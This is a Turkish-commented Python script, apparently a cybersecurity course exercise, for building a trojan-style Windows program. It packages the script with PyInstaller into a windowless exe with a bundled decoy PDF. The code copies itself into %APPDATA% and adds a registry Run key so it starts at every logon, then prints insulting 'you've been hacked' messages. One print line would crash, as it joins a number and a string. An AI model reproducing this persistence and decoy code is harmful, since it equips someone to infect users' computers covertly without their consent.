# pip installer pyinstaller -> exe'ye çevirmek için işe yarar
# pyinstaller dosya.py --onefile  -> dosyayı exe haline çevirir --onefile -> tek dosya haline gelir
# pyinstaller dosya.py --onefile --add-data "C:\Users\dosyaNeredeDuruyorsaDosyaYolu;." sonuna bir noktalı virgül ve nokta eklenir
# pyinstaller dosya.py --onefile --add-data "C:\Users\dosyaNeredeDuruyorsaDosyaYolu;." --noconsole -> console açılmaz
# # pyinstaller dosya.py --onefile --add-data "C:\Users\dosyaNeredeDuruyorsaDosyaYolu;." --icon C:\Users\icon'undosya yolu
# yazdığımız dosyalara icon eklemek istiyorsak resmimizin uzantısı .ico olmalıdır
# reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v isim /t REG_SZ /d path(C:\Users\meb\Desktop\CyberSecurity-Python\Dosyalama) -> regedit dosyasına ekleme işlemi için komut bu sayede dosya açılışta çalıştırılabilir
import time
import subprocess
import os
import shutil # dosyalarımızı kopyalamak için gerekli kütüphane
import sys

def add_to_registry():
    # persistence
    new_file = os.environ["appdata"] + "\\paketleme.exe" # içeri verilen dosyanın yerini verir. bu kod ile biz kendimize app data altında paketleme.exe adında bir dosya yolu oluşturduk
    if not os.path.exists(new_file): # eğer bu dosya yoksa bu bloğu çalıştır
        shutil.copyfile(sys.executable,new_file) # içinde bulunduğum dosyayı al new_file yoluna kopyala. sys.executable -> içinde bulunduğum dosyayı demektir
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v paketleme /t REG_SZ /d " + new_file
        subprocess.call(regedit_command,shell=True) # regedit_command'ı çalıştırıyoruz

def open_added_file(): # projeyi arkada çalıştırırken önde kullanıcıya bu dosyanın gösterilmesi için bu kodlar dosya içerisinde çağrılmışken derlenmesi gerekir
    added_file = sys._MEIPASS + "\\pythonIntro.pdf" # MEIPASS -> pyinstaller ile derlerken verdiğimiz dosya adi ile birlikte tek dosya haline getirir
    subprocess.Popen(added_file,shell=True) # arka planda bu dosyayı çalıştırmaya yarar fakat added_file'ı gösterir

add_to_registry()


x = 0
name = input("Adınız nedir : ")
print("Kusura bakma bilgisayarın b*ku yedi Sayın {}".format(name))
print("I kecked you kekoooo " + name + " :)")
while x < 100:
    if x %2==0:
        print(x + " kere salaksın " + name)
    x+=1

# my_check = subprocess.check_output("command", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL) # -> standart input ve outputların NULL'a boşluğa eşitliyoruz. Başka projelerimizde subporcess.check_output varsa böyle kullanmalıyız
